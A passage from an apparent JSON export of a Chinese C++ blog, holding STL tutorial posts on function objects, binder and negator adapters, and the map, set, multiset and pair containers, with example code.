v2.push_back(i); &#125; vector&lt;int&gt;::iterator it; int a = 4; Isdiv&lt;int&gt; mydiv(a); // _InIt find_if(_InIt _First, _InIt _Last, _Pr _Pred) //返回的是迭代器 it = find_if(v2.begin(), v2.end(), Isdiv&lt;int&gt;(4)); if (it != v2.end()) &#123; cout &lt;&lt; &quot;第一个被4整除的数是：&quot; &lt;&lt; *it &lt;&lt; endl; &#125;&#125; 二元函数对象案例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253template &lt;typename T&gt;struct SumAdd&#123; T operator()(T &amp;t1, T &amp;t2) &#123; return t1 + t2; &#125;&#125;;template &lt;typename T&gt;void printE(T &amp;t)&#123; for (vector&lt;int&gt;::iterator it = t.begin(); it!=t.end(); it++ ) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125;&#125;void printVector(vector&lt;int&gt; &amp;v)&#123; for (vector&lt;int&gt;::iterator it = v.begin(); it!=v.end(); it++ ) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot;; &#125;&#125;void main14()&#123; vector&lt;int&gt; v1, v2 ; vector&lt;int&gt; v3; v1.push_back(1); v1.push_back(2); v1.push_back(3); v2.push_back(4); v2.push_back(5); v2.push_back(6); v3.resize(10); //transform(v1.begin(), v1.end(), v2.begin(),v3.begin(), SumAdd&lt;int&gt;()); /* template&lt;class _InIt1, class _InIt2, class _OutIt, class _Fn2&gt; inline _OutIt transform(_InIt1 _First1, _InIt1 _Last1, _InIt2 _First2, _OutIt _Dest, _Fn2 _Func) */ vector&lt;int&gt;::iterator it = transform(v1.begin(), v1.end(), v2.begin(),v3.begin(), SumAdd&lt;int&gt;()); cout &lt;&lt; *it &lt;&lt; endl; printE(v3); &#125; 二元谓词案例 1234567891011121314151617181920212223242526272829void current(int &amp;v)&#123; cout &lt;&lt; v &lt;&lt; &quot; &quot;;&#125;bool MyCompare(const int &amp;a, const int &amp;b)&#123; return a &lt; b;&#125;void main15()&#123; vector&lt;int&gt; v(10); for (int i=0; i&lt;10; i++) &#123; v[i] = rand() % 100; &#125; for_each(v.begin(), v.end(), current); printf(&quot;\\n&quot;); sort(v.begin(), v.end(), MyCompare ); printf(&quot;\\n&quot;); for (int i=0; i&lt;10; i++) &#123; printf(&quot;%d &quot;, v[i]); &#125; printf(&quot;\\n&quot;);&#125; 预定义函数对象和函数适配器 预定义函数对象基本概念：标准模板库STL提前定义了很多预定义函数对象，#include &lt;functional&gt; 必须包含。 1234567891011121314151617181920212223242526272829//1使用预定义函数对象：//类模板plus&lt;&gt; 的实现了： 不同类型的数据进行加法运算void main41()&#123; plus&lt;int&gt; intAdd; int x = 10; int y = 20; int z = intAdd(x, y); //等价于 x + y cout &lt;&lt; z &lt;&lt; endl; plus&lt;string&gt; stringAdd; string myc = stringAdd(&quot;aaa&quot;, &quot;bbb&quot;); cout &lt;&lt; myc &lt;&lt; endl; vector&lt;string&gt; v1; v1.push_back(&quot;bbb&quot;); v1.push_back(&quot;aaa&quot;); v1.push_back(&quot;ccc&quot;); v1.push_back(&quot;zzzz&quot;); //缺省情况下，sort()用底层元素类型的小于操作符以升序排列容器的元素。 //为了降序，可以传递预定义的类模板greater,它调用底层元素类型的大于操作符： cout &lt;&lt; &quot;sort()函数排序&quot; &lt;&lt; endl;; sort(v1.begin(), v1.end(), greater&lt;string&gt;() ); //从大到小 for (vector&lt;string&gt;::iterator it=v1.begin(); it!=v1.end(); it++ ) &#123; cout &lt;&lt; *it &lt;&lt; endl; &#125;&#125; 算术函数对象 123456789101112预定义的函数对象支持加、减、乘、除、求余和取反。调用的操作符是与type相关联的实例加法：plus&lt;Types&gt;plus&lt;string&gt; stringAdd;sres = stringAdd(sva1,sva2);减法：minus&lt;Types&gt;乘法：multiplies&lt;Types&gt;除法divides&lt;Tpye&gt;求余：modulus&lt;Tpye&gt;取反：negate&lt;Type&gt;negate&lt;int&gt; intNegate;ires = intNegate(ires);Ires= UnaryFunc(negate&lt;int&gt;(),Ival1); 关系函数对象 12345678等于equal_to&lt;Tpye&gt;equal_to&lt;string&gt; stringEqual;sres = stringEqual(sval1,sval2);不等于not_equal_to&lt;Type&gt;大于 greater&lt;Type&gt;大于等于greater_equal&lt;Type&gt;小于 less&lt;Type&gt;小于等于less_equal&lt;Type&gt; 12345678910111213void main42()&#123; vector&lt;string&gt; v1; v1.push_back(&quot;bbb&quot;); v1.push_back(&quot;aaa&quot;); v1.push_back(&quot;ccc&quot;); v1.push_back(&quot;zzzz&quot;); v1.push_back(&quot;ccc&quot;); string s1 = &quot;ccc&quot;; //int num = count_if(v1.begin(),v1.end(), equal_to&lt;string&gt;(),s1); int num = count_if(v1.begin(),v1.end(),bind2nd(equal_to&lt;string&gt;(), s1)); cout &lt;&lt; num &lt;&lt; endl;&#125; 逻辑函数对象 123456789逻辑与 logical_and&lt;Type&gt;logical_and&lt;int&gt; indAnd;ires = intAnd(ival1,ival2);dres=BinaryFunc( logical_and&lt;double&gt;(),dval1,dval2);逻辑或 logical_or&lt;Type&gt;逻辑非 logical_not&lt;Type&gt;logical_not&lt;int&gt; IntNot;Ires = IntNot(ival1);Dres=UnaryFunc( logical_not&lt;double&gt;,dval1); 函数适配器 ​ 函数适配器的理论知识 常用函数函数适配器 标准库提供一组函数适配器，用来特殊化或者扩展一元和二元函数对象。常用适配器是： 1绑定器（binder）: binder通过把二元函数对象的一个实参绑定到一个特殊的值上，将其转换成一元函数对象。C＋＋标准库提供两种预定义的binder适配器：bind1st和bind2nd，前者把值绑定到二元函数对象的第一个实参上，后者绑定在第二个实参上。 2取反器(negator) : negator是一个将函数对象的值翻转的函数适配器。标准库提供两个预定义的ngeator适配器：not1翻转一元预定义函数对象的真值,而not2翻转二元谓词函数的真值。 常用函数适配器列表如下： bind1st(op, value) bind2nd(op, value) not1(op) not2(op) mem_fun_ref(op) mem_fun(op) ptr_fun(op) 3）常用函数适配器案例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class IsGreat&#123;public: IsGreat(int i) &#123; m_num = i; &#125; bool operator()(int &amp;num) &#123; if (num &gt; m_num) &#123; return true; &#125; return false; &#125;protected:private: int m_num;&#125;;void main43()&#123; vector&lt;int&gt; v1; for (int i=0; i&lt;5; i++) &#123; v1.push_back(i+1); &#125; for (vector&lt;int&gt;::iterator it = v1.begin(); it!=v1.end(); it ++) &#123; cout &lt;&lt; *it &lt;&lt; &quot; &quot; ; &#125; int num1 = count(v1.begin(), v1.end(), 3); cout &lt;&lt; &quot;num1:&quot; &lt;&lt; num1 &lt;&lt; endl; //通过谓词求大于2的个数 int num2 = count_if(v1.begin(), v1.end(), IsGreat(2)); cout &lt;&lt; &quot;num2:&quot; &lt;&lt; num2 &lt;&lt; endl; //通过预定义函数对象求大于2的个数 greater&lt;int&gt;() 有2个参数 // param &gt; 2 int num3 = count_if(v1.begin(), v1.end(), bind2nd(greater&lt;int&gt;(), 2 ) ); cout &lt;&lt; &quot;num3:&quot; &lt;&lt; num3 &lt;&lt; endl; //取模 能被2整除的数 求奇数 int num4 = count_if(v1.begin(), v1.end(), bind2nd(modulus &lt;int&gt;(), 2 ) ); cout &lt;&lt; &quot;奇数num4:&quot; &lt;&lt; num4 &lt;&lt; endl; int num5 = count_if(v1.begin(), v1.end(), not1( bind2nd(modulus &lt;int&gt;(), 2 ) ) ); cout &lt;&lt; &quot;偶数num5:&quot; &lt;&lt; num5 &lt;&lt; endl; return ;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;using namespace std;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;functional&gt;class MyPrint:public binary_function&lt;int,int,void&gt;&#123;public: void operator()(int v, int start) const &#123; cout &lt;&lt; &quot;v=&quot; &lt;&lt; v &lt;&lt; &quot;start=&quot; &lt;&lt; start &lt;&lt; &quot;v+start=&quot; &lt;&lt; v + start &lt;&lt; endl; &#125;&#125;;void test01()&#123; vector&lt;int&gt;v; for (int i = 0; i &lt; 10; i++) &#123; v.push_back(i); &#125; cout &lt;&lt; &quot;请输入一个起始值：&quot; &lt;&lt; endl; int num; cin &gt;&gt; num; //for_each(v.begin(), v.end(), bind2nd (MyPrint(),num)); for_each(v.begin(), v.end(), bind1st(MyPrint(), num));&#125;//第一步，绑定数据 bind2nd//第二步，继承类 binary_function&lt;参数类型1，参数类型2，返回值类型&gt;//第三步，加const修饰operator()int main()&#123; test01(); system(&quot;pause&quot;); return 0;&#125; 取反适配器 1234567891011121314151617181920212223242526272829303132333435363738394041424344class MyPrint:public binary_function&lt;int,int,void&gt;&#123;public: void operator()(int v, int start) const &#123; cout &lt;&lt; &quot;v=&quot; &lt;&lt; v &lt;&lt; &quot;start=&quot; &lt;&lt; start &lt;&lt; &quot;v+start=&quot; &lt;&lt; v + start &lt;&lt; endl; &#125;&#125;; //取反适配器class CreateThenFive:public unary_function&lt;int,bool&gt;&#123;public: bool operator()(int v)const &#123; return v &gt; 5; &#125;&#125;; void test02() &#123; //一元取反 vector&lt;int&gt;v; for (int i = 0; i &lt; 10; i++) &#123; v.push_back(i); &#125; //查找大于5的数字 //需求改为找小于5的数字 //vector&lt;int&gt;::iterator pos=find_if(v.begin(), v.end(),not1 (CreateThenFive())); vector&lt;int&gt;::iterator pos=find_if(v.begin(), v.end(),not1(bind2nd(greater&lt;int&gt;(),5))); if (pos != v.end()) &#123; cout &lt;&lt; &quot;找到大于5的数字为：&quot; &lt;&lt;*pos&lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;未找到&quot; &lt;&lt; endl; &#125;&#125;//一元取反适配器 not1//继承unary_fuction&lt;类型1，返回值类型&gt;//const 10.3.2.8 STL的容器算法迭代器的设计理念 1） STL的容器通过类模板技术，实现数据类型和容器模型的分离。 2） STL的迭代器技术实现了遍历容器的统一方法；也为STL的算法提供了统一性 3） STL的函数对象实现了自定义数据类型的算法运算。（算法和） 4） 具体例子：transform算法的输入，通过迭代器first和last指向的元算作为输入；通过result作为输出；通过函数对象来做自定义数据类型的运算。","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"容器共性机制研究","slug":"cpp0087-容器共性机制研究","date":"2021-07-05T06:41:46.000Z","updated":"2021-07-05T06:51:15.814Z","comments":true,"path":"2021/07/05/cpp0087-容器共性机制研究/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0087-容器共性机制研究/","excerpt":"","text":"容器的共通能力 C++模板是容器的概念。 理论提高：所有容器提供的都是值（value）语意，而非引用（reference）语意。容器执行插入元素的操作时，内部实施拷贝动作。所以STL容器内存储的元素必须能够被拷贝（必须提供拷贝构造函数）。 除了queue与stack外，每个容器都提供可返回迭代器的函数，运用返回的迭代器就可以访问元素。 通常STL不会丢出异常。要求使用者确保传入正确的参数。 每个容器都提供了一个默认构造函数跟一个默认拷贝构造函数。 如已有容器vecIntA。 vector&lt;int&gt; vecIntB(vecIntA); //调用拷贝构造函数，复制vecIntA到vecIntB中。 与大小相关的操作方法(c代表容器)： c.size(); //返回容器中元素的个数 c.empty(); //判断容器是否为空 比较操作(c1,c2代表容器)： c1 == c2 判断c1是否等于c2 c1 != c2 判断c1是否不等于c2 c1 = c2 把c2的所有元素指派给c1 各个容器的使用时机 deque的使用场景：比如排队购票系统，对排队者的存储可以采用deque，支持头端的快速移除，尾端的快速添加。如果采用vector，则头端移除时，会移动大量的数据，速度慢。 vector与deque的比较： 一：vector.at()比deque.at()效率高，比如vector.at(0)是固定的，deque的开始位置却是不固定的。 二：如果有大量释放操作的话，vector花的时间更少，这跟二者的内部实现有关。 三：deque支持头部的快速插入与快速移除，这是deque的优点。 list的使用场景：比如公交车乘客的存储，随时可能有乘客下车，支持频繁的不确实位置元素的移除插入。 set的使用场景：比如对手机游戏的个人得分记录的存储，存储要求从高分到低分的顺序排列。 map的使用场景：比如按ID号存储十万个用户，想要快速要通过ID查找对应的用户。二叉树的查找效率，这时就体现出来了。如果是vector容器，最坏的情况下可能要遍历完整个容器才能找到该用户。","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"Map和multimap容器","slug":"cpp0086-Map和multimap容器","date":"2021-07-05T06:30:26.000Z","updated":"2021-07-05T06:41:11.889Z","comments":true,"path":"2021/07/05/cpp0086-Map和multimap容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0086-Map和multimap容器/","excerpt":"","text":"Map和multimap容器 map是标准的关联式容器，一个map是一个键值对序列，即(key,value)对。它提供基于key的快速检索能力。 map中key值是唯一的。集合中的元素按一定的顺序排列。元素插入过程是按排序规则插入，所以不能指定插入位置。 map的具体实现采用红黑树变体的平衡二叉树的数据结构。在插入操作和删除操作上比vector快。 map可以直接存取key所对应的value，支持[]操作符，如map[key]=value。 multimap与map的区别：map支持唯一键值，每个键只能出现一次；而multimap中相同键可以出现多次。multimap不支持[]操作符。 #include &lt;map&gt; map/multimap对象的默认构造 1234567map/multimap采用模板类实现，对象的默认构造形式：map&lt;T1,T2&gt; mapTT; multimap&lt;T1,T2&gt; multimapTT; 如：map&lt;int, char&gt; mapA;map&lt;string,float&gt; mapB;//其中T1,T2还可以用各种指针类型或自定义类型 map的插入与迭代器 map.insert(…); //往容器插入元素，返回pair&lt;iterator,bool&gt; 在map中插入元素的三种方式： 假设 map&lt;int, string&gt; mapStu; 一、通过pair的方式插入对象 mapStu.insert( pair&lt;int,string&gt;(3,“小张”) ); 二、通过pair的方式插入对象 mapStu.inset(make_pair(-1, “校长-1”)); 三、通过value_type的方式插入对象 mapStu.insert( map&lt;int,string&gt;::value_type(1,“小李”) ); 四、通过数组的方式插入值 mapStu[3] = “小刘&quot;; mapStu[5] = “小王&quot;； ​ 前三种方法，采用的是insert()方法，该方法返回值为pair 第四种方法非常直观，但存在一个性能的问题。插入3时，先在mapStu中查找主键为3的项，若没发现，则将一个键为3，值为初始化值的对组插入到mapStu中，然后再将值修改成“小刘”。若发现已存在3这个键，则修改这个键对应的value。 string strName = mapStu[2]; //取操作或插入操作 只有当mapStu存在2这个键时才是正确的取操作，否则会自动插入一个实例，键为2，值为初始化值。 1234567891011121314151617181920212223假设 map&lt;int, string&gt; mapA;pair&lt; map&lt;int,string&gt;::iterator, bool &gt; pairResult = mapA.insert(pair&lt;int,string&gt;(3,&quot;小张&quot;)); //插入方式一int iFirstFirst = (pairResult.first)-&gt;first; //iFirst == 3;string strFirstSecond = (pairResult.first)-&gt;second; //strFirstSecond为&quot;小张&quot;bool bSecond = pairResult.second; //bSecond == true; mapA.insert(map&lt;int,string&gt;::value_type(1,&quot;小李&quot;)); //插入方式二mapA[3] = &quot;小刘&quot;; //修改valuemapA[5] = &quot;小王&quot;; //插入方式三string str1 = mapA[2]; //执行插入 string() 操作，返回的str1的字符串内容为空。string str2 = mapA[3]; //取得value，str2为&quot;小刘&quot;//迭代器遍历 for (map&lt;int,string&gt;::iterator it=mapA.begin(); it!=mapA.end(); ++it) &#123; pair&lt;int, string&gt; pr = *it; int iKey = pr.first; string strValue = pr.second; &#125; 12345678map&lt;T1,T2,less&lt;T1&gt; &gt; mapA; //该容器是按键的升序方式排列元素。未指定函数对象，默认采用less&lt;T1&gt;函数对象。map&lt;T1,T2,greater&lt;T1&gt;&gt; mapB; //该容器是按键的降序方式排列元素。less&lt;T1&gt;与greater&lt;T1&gt; 可以替换成其它的函数对象functor。可编写自定义函数对象以进行自定义类型的比较，使用方法与set构造时所用的函数对象一样。map.begin(); //返回容器中第一个数据的迭代器。map.end(); //返回容器中最后一个数据之后的迭代器。map.rbegin(); //返回容器中倒数第一个元素的迭代器。map.rend(); //返回容器中倒数最后一个元素的后面的迭代器。 map对象的拷贝构造与赋值 123map(const map &amp;mp); //拷贝构造函数map&amp; operator=(const map &amp;mp); //重载等号操作符map.swap(mp); //交换两个集合容器 1234567891011121314例如: map&lt;int, string&gt; mapA; mapA.insert(pair&lt;int,string&gt;(3,&quot;小张&quot;)); mapA.insert(pair&lt;int,string&gt;(1,&quot;小杨&quot;)); mapA.insert(pair&lt;int,string&gt;(7,&quot;小赵&quot;)); mapA.insert(pair&lt;int,string&gt;(5,&quot;小王&quot;)); map&lt;int ,string&gt; mapB(mapA); //拷贝构造 map&lt;int, string&gt; mapC; mapC = mapA; //赋值 mapC[3] = &quot;老张&quot;; mapC.swap(mapA); //交换 map的大小 12map.size(); //返回容器中元素的数目map.empty();//判断容器是否为空 12345678910map&lt;int, string&gt; mapA; mapA.insert(pair&lt;int,string&gt;(3,&quot;小张&quot;)); mapA.insert(pair&lt;int,string&gt;(1,&quot;小杨&quot;)); mapA.insert(pair&lt;int,string&gt;(7,&quot;小赵&quot;)); mapA.insert(pair&lt;int,string&gt;(5,&quot;小王&quot;)); if (mapA.empty()) &#123; int iSize = mapA.size(); //iSize == 4 &#125; map的删除 1234map.clear(); //删除所有元素map.erase(pos); //删除pos迭代器所指的元素，返回下一个元素的迭代器。map.erase(beg,end); //删除区间[beg,end)的所有元素 ，返回下一个元素的迭代器。map.erase(keyElem); //删除容器中key为keyElem的对组。 12345678910111213141516171819202122232425map&lt;int, string&gt; mapA; mapA.insert(pair&lt;int,string&gt;(3,&quot;小张&quot;)); mapA.insert(pair&lt;int,string&gt;(1,&quot;小杨&quot;)); mapA.insert(pair&lt;int,string&gt;(7,&quot;小赵&quot;)); mapA.insert(pair&lt;int,string&gt;(5,&quot;小王&quot;)); //删除区间内的元素 map&lt;int,string&gt;::iterator itBegin=mapA.begin(); ++ itBegin; ++ itBegin; map&lt;int,string&gt;::iterator itEnd=mapA.end(); mapA.erase(itBegin,itEnd); //此时容器mapA包含按顺序的&#123;1,&quot;小杨&quot;&#125;&#123;3,&quot;小张&quot;&#125;两个元素。 mapA.insert(pair&lt;int,string&gt;(7,&quot;小赵&quot;)); mapA.insert(pair&lt;int,string&gt;(5,&quot;小王&quot;)); //删除容器中第一个元素 mapA.erase(mapA.begin()); //此时容器mapA包含了按顺序的&#123;3,&quot;小张&quot;&#125;&#123;5,&quot;小王&quot;&#125;&#123;7,&quot;小赵&quot;&#125;三个元素 //删除容器中key为5的元素 mapA.erase(5); //删除mapA的所有元素 mapA.clear(); //容器为空 map的查找 12map.find(key); 查找键key是否存在，若存在，返回该键的元素的迭代器；若不存在，返回map.end();map.count(keyElem); //返回容器中key为keyElem的对组个数。对map来说，要么是0，要么是1。对multimap来说，值可能大于1。 123456789101112map&lt;int,string&gt;::iterator it=mapStu.find(3);if(it == mapStu.end())&#123; //没找到&#125;else&#123; //找到了 pair&lt;int, string&gt; pairStu = *it; int iID = pairStu.first; //或 int iID = it-&gt;first; string strName = pairStu.second; //或 string strName = it-&gt;second;&#125; 1234567map.lower_bound(keyElem); //返回第一个key&gt;=keyElem元素的迭代器。map.upper_bound(keyElem); // 返回第一个key&gt;keyElem元素的迭代器。例如： mapStu是用map&lt;int,string&gt;声明的容器，已包含&#123;1,&quot;小李&quot;&#125;&#123;3,&quot;小张&quot;&#125;&#123;5,&quot;小王&quot;&#125;&#123;7,&quot;小赵&quot;&#125;&#123;9,&quot;小陈&quot;&#125;元素。map&lt;int,string&gt;::iterator it;it = mapStu.lower_bound(5); //it-&gt;first==5 it-&gt;second==&quot;小王&quot;it = mapStu.upper_bound(5); //it-&gt;first==7 it-&gt;second==&quot;小赵&quot;it = mapStu.lower_bound(6); //it-&gt;first==7 it-&gt;second==&quot;小赵&quot;it = mapStu.upper_bound(6); //it-&gt;first==7 it-&gt;second==&quot;小赵&quot; 1234567891011map.equal_range(keyElem); //返回容器中key与keyElem相等的上下限的两个迭代器。上限是闭区间，下限是开区间，如[beg,end)。 以上函数返回两个迭代器，而这两个迭代器被封装在pair中。例如 map&lt;int,string&gt; mapStu;... //往mapStu容器插入元素&#123;1,&quot;小李&quot;&#125;&#123;3,&quot;小张&quot;&#125;&#123;5,&quot;小王&quot;&#125;&#123;7,&quot;小赵&quot;&#125;&#123;9,&quot;小陈&quot;&#125;pair&lt; map&lt;int,string&gt;::iterator , map&lt;int,string&gt;::iterator &gt; pairIt = mapStu.equal_range(5);map&lt;int, string&gt;::iterator itBeg = pairIt.first;map&lt;int, string&gt;::iterator itEnd = pairIt.second;//此时 itBeg-&gt;first==5 , itEnd-&gt;first == 7,itBeg-&gt;second==&quot;小王&quot;, itEnd-&gt;second==&quot;小赵&quot;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"Set和multiset容器","slug":"cpp0085-Set和multiset容器","date":"2021-07-05T06:17:49.000Z","updated":"2021-07-05T06:29:05.034Z","comments":true,"path":"2021/07/05/cpp0085-Set和multiset容器/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0085-Set和multiset容器/","excerpt":"","text":"Set和multiset容器 set是一个集合容器，其中所包含的元素是唯一的，集合中的元素按一定的顺序排列。元素插入过程是按排序规则插入，所以不能指定插入位置。 set采用红黑树变体的数据结构实现，红黑树属于平衡二叉树。在插入操作和删除操作上比vector快。 set不可以直接存取元素。（不可以使用at.(pos)与[]操作符）。 multiset与set的区别：set支持唯一键值，每个元素值只能出现一次；而multiset中同一值可以出现多次。 不可以直接修改set或multiset容器中的元素值，因为该类容器是自动排序的。如果希望修改一个元素值，必须先删除原有的元素，再插入新的元素。 #include &lt;set&gt; set/multiset对象的默认构造 123456set&lt;int&gt; setInt; //一个存放int的set容器。set&lt;float&gt; setFloat; //一个存放float的set容器。set&lt;string&gt; setString; //一个存放string的set容器。multiset&lt;int&gt; mulsetInt; //一个存放int的multi set容器。multi set&lt;float&gt; multisetFloat; //一个存放float的multi set容器。multi set&lt;string&gt; multisetString; //一个存放string的multi set容器。 set的插入与迭代器 12345set.insert(elem); //在容器中插入元素。set.begin(); //返回容器中第一个数据的迭代器。set.end(); //返回容器中最后一个数据之后的迭代器。set.rbegin(); //返回容器中倒数第一个元素的迭代器。set.rend(); //返回容器中倒数最后一个元素的后面的迭代器。 12345678910set&lt;int&gt; setInt;setInt.insert(3); setInt.insert(1);setInt.insert(5);setInt.insert(2);for(set&lt;int&gt;::iterator it=setInt.begin(); it!=setInt.end(); ++it)&#123; int iItem = *it; cout &lt;&lt; iItem; //或直接使用cout &lt;&lt; *it&#125;//这样子便顺序输出 1 2 3 5。set.rbegin()与set.rend() Set集合的元素排序 123456789101112131415161718set&lt;int,less&lt;int&gt; &gt; setIntA; //该容器是按升序方式排列元素。set&lt;int,greater&lt;int&gt;&gt; setIntB; //该容器是按降序方式排列元素。set&lt;int&gt; 相当于 set&lt;int,less&lt;int&gt;&gt;。less&lt;int&gt;与greater&lt;int&gt;中的int可以改成其它类型，该类型主要要跟set容纳的数据类型一致。//疑问1：less&lt;&gt;与greater&lt;&gt;是什么？疑问2：如果set&lt;&gt;不包含int类型，而是包含自定义类型，set容器如何排序？要解决如上两个问题，需要了解容器的函数对象，也叫伪函数，英文名叫functor。下面将讲解什么是functor，functor的用法。使用stl提供的函数对象set&lt;int,greater&lt;int&gt;&gt; setIntB; setIntB.insert(3);setIntB.insert(1);setIntB.insert(5);setIntB.insert(2);此时容器setIntB就包含了按顺序的5,3,2,1元素 函数对象functor的用法 尽管函数指针被广泛用于实现函数回调，但C++还提供了一个重要的实现回调函数的方法，那就是函数对象。 functor，翻译成函数对象，伪函数，算符，是重载了“()”操作符的普通类对象。从语法上讲，它与普通函数行为类似。 greater&lt;&gt;与less&lt;&gt;就是函数对象。 下面举出greater&lt;int&gt;的简易实现原理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445struct greater&#123;bool operator() (const int&amp; iLeft, const int&amp; iRight)&#123; return (iLeft&gt;iRight); //如果是实现less&lt;int&gt;的话，这边是写return (iLeft&lt;iRight);&#125;&#125;容器就是调用函数对象的operator()方法去比较两个值的大小。题目：学生包含学号，姓名属性，现要求任意插入几个学生对象到set容器中，使得容器中的学生按学号的升序排序。解：//学生类class CStudent&#123; public: CStudent(int iID, string strName) &#123; m_iID = iID; m_strName = strName; &#125; int m_iID; //学号 string m_strName; //姓名&#125;//为保持主题鲜明，本类不写拷贝构造函数，本类也不需要写拷贝构造函数。但大家仍要有考虑拷贝构造函数的习惯。//函数对象struct StuFunctor&#123; bool operator() (const CStudent &amp;stu1, const CStudent &amp;stu2) &#123; return (stu1.m_iID&lt;stu2.m_iID); &#125;&#125;//main函数void main()&#123; set&lt;CStudent, StuFunctor&gt; setStu; setStu.insert(CStudent(3,&quot;小张&quot;)); setStu.insert(CStudent(1,&quot;小李&quot;)); setStu.insert(CStudent(5,&quot;小王&quot;)); setStu.insert(CStudent(2,&quot;小刘&quot;)); //此时容器setStu包含了四个学生对象，分别是按姓名顺序的“小李”，“小刘”，“小张”，“小王” &#125; set对象的拷贝构造与赋值 123set(const set &amp;st); //拷贝构造函数set&amp; operator=(const set &amp;st); //重载等号操作符set.swap(st); //交换两个集合容器 1234567891011121314set&lt;int&gt; setIntA; setIntA.insert(3); setIntA.insert(1); setIntA.insert(7); setIntA.insert(5); setIntA.insert(9); set&lt;int&gt; setIntB(setIntA); //1 3 5 7 9 set&lt;int&gt; setIntC; setIntC = setIntA; //1 3 5 7 9 setIntC.insert(6); setIntC.swap(setIntA); //交换 set的大小 12set.size(); //返回容器中元素的数目set.empty();//判断容器是否为空 1234567891011set&lt;int&gt; setIntA; setIntA.insert(3); setIntA.insert(1); setIntA.insert(7); setIntA.insert(5); setIntA.insert(9); if (!setIntA.empty()) &#123; int iSize = setIntA.size(); //5 &#125; set的删除 1234set.clear(); //清除所有元素set.erase(pos); //删除pos迭代器所指的元素，返回下一个元素的迭代器。set.erase(beg,end); //删除区间[beg,end)的所有元素 ，返回下一个元素的迭代器。set.erase(elem); //删除容器中值为elem的元素。 1234567891011121314151617181920删除区间内的元素setInt是用set&lt;int&gt;声明的容器，现已包含按顺序的1,3,5,6,9,11元素。set&lt;int&gt;::iterator itBegin=setInt.begin();++ itBegin;set&lt;int&gt;::iterator itEnd=setInt.begin();++ itEnd;++ itEnd;++ itEnd;setInt.erase(itBegin,itEnd);//此时容器setInt包含按顺序的1,6,9,11四个元素。删除容器中第一个元素setInt.erase(setInt.begin()); //6,9,11删除容器中值为9的元素set.erase(9); 删除setInt的所有元素setInt.clear(); //容器为空 set的查找 12345678910set.find(elem); //查找elem元素，返回指向elem元素的迭代器。set.count(elem); //返回容器中值为elem的元素个数。对set来说，要么是0，要么是1。对multiset来说，值可能大于1。set.lower_bound(elem); //返回第一个&gt;=elem元素的迭代器。set.upper_bound(elem); // 返回第一个&gt;elem元素的迭代器。set.equal_range(elem); //返回容器中与elem相等的上下限的两个迭代器。上限是闭区间，下限是开区间，如[beg,end)。 以上函数返回两个迭代器，而这两个迭代器被封装在pair中。以下讲解pair的含义与使用方法。 1234567891011121314151617set&lt;int&gt; setInt; setInt.insert(3); setInt.insert(1); setInt.insert(7); setInt.insert(5); setInt.insert(9); set&lt;int&gt;::iterator itA = setInt.find(5); int iA = *itA; //iA == 5 int iCount = setInt.count(5); //iCount == 1 set&lt;int&gt;::iterator itB = setInt.lower_bound(5); set&lt;int&gt;::iterator itC = setInt.upper_bound(5); int iB = *itB; //iB == 5 int iC = *itC; //iC == 7pair&lt; set&lt;int&gt;::iterator, set&lt;int&gt;::iterator &gt; pairIt = setInt.equal_range(5); //pair是什么？ pair的使用 1234pair译为对组，可以将两个值视为一个单元。pair&lt;T1,T2&gt;存放的两个值的类型，可以不一样，如T1为int，T2为float。T1,T2也可以是自定义类型。pair.first是pair里面的第一个值，是T1类型。pair.second是pair里面的第二个值，是T2类型。 123456set&lt;int&gt; setInt;... //往setInt容器插入元素1,3,5,7,9pair&lt; set&lt;int&gt;::iterator , set&lt;int&gt;::iterator &gt; pairIt = setInt.equal_range(5);set&lt;int&gt;::iterator itBeg = pairIt.first;set&lt;int&gt;::iterator itEnd = pairIt.second;//此时 *itBeg==5 而 *itEnd == 7 小结 一、容器set/multiset的使用方法； ​ 红黑树的变体，查找效率高，插入不能指定位置，插入时自动排序。 二、functor的使用方法； 类似于函数的功能，可用来自定义一些规则，如元素比较规则。 三、pair的使用方法。 ​ 对组，一个整体的单元，存放两个类型(T1,T2，T1可与T2一样)的两个元素。 案例: 123456789101112131415161718192021int x; scanf(&quot;%ld&quot;,&amp;x); multiset&lt;int&gt; h;//建立一个multiset类型，变量名是h，h序列里面存的是int类型,初始h为空 while(x!=0)&#123; h.insert(x);//将x插入h中 scanf(&quot;%ld&quot;,&amp;x); &#125; pair&lt; multiset&lt;int&gt;::iterator , multiset&lt;int&gt;::iterator &gt; pairIt = h.equal_range(22);multiset&lt;int&gt;::iterator itBeg = pairIt.first;multiset&lt;int&gt;::iterator itEnd = pairIt.second;int nBeg = *itBeg;int nEnd = *itEnd; while(!h.empty())&#123;// 序列非空h.empty()==true时表示h已经空了 multiset&lt;int&gt;::iterator c = h.begin();//c指向h序列中第一个元素的地址，第一个元素是最小的元素 printf(&quot;%ld &quot;,*c);//将地址c存的数据输出 h.erase(c);//从h序列中将c指向的元素删除 &#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"优先级队列priority_queue","slug":"cpp0084-优先级队列priority-queue","date":"2021-07-05T06:02:34.000Z","updated":"2021-07-05T06:09:00.163Z","comments":true,"path":"2021/07/05/cpp0084-优先级队列priority-queue/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/05/cpp0084-优先级队列priority-queue/","excerpt":"","text":"优先级队列priority_queue 最大值优先级队列、最小值优先级队列 优先级队列适配器 STL priority_queue 用来开发一些特殊的应用,请对stl的类库,多做扩展性学习 默认是从大到小插入 1234567priority_queue&lt;int, deque&lt;int&gt;&gt; 